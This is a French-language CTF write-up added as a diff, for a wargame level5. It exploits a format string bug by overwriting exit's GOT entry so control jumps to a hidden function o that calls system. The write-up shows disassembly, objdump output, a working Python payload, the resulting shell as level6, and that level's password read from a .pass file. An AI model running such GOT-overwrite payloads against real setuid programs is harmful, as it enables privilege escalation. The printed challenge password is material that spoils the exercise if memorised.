@@ -1,0 +1,40 @@
+# Comme 3 et 4, sauf qu'en disas on voit une fonction o qui est pas appelé et qui contient l'appel system
+
+80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt> <- Toujours ça 
+
+80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt> <- Et ça
+
+# Tjrs une Format string attack, sauf qu'apres on a:
+
+ 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt> <- On va essayer de modif ça pour call la fonction o
+ 
+
+ 080484a4 <o>: <- L'adresse de o, soit l'adresse qui doit remplacer l'adresse d'exit dans la GOT(Global Offset Table),
+ donc on le met en decimal 134513828 psq %d
+
+# On cherche donc l'addresse de exit dans iel DRR (DYNAMIC RELOCATION RECORDS)
+objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit                     <- C'est la
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+> python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
+> cat /tmp/exploit5 - | ./level5
+*** char char char ***
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+# BRRRRRRRRRRRRRRRRR Yippee-Ki-Yay, Motherfucker!
